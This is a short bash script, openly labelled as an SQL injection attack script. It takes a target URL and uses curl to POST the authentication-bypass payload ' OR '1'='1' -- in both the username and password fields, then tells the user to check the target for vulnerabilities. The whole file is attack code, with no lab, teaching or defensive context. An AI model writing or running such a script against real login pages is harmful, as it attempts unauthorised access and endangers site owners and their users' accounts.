#!/bin/bash

# Check if target URL is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

# Define a sample SQL injection payload
SQL_PAYLOAD="' OR '1'='1' -- "

# Perform the SQL injection attack using curl
echo "Attempting SQL Injection on $TARGET_URL..."
curl -X POST -d "username=$SQL_PAYLOAD&password=$SQL_PAYLOAD" $TARGET_URL

echo "SQL Injection attack script completed. Check the target for vulnerabilities."
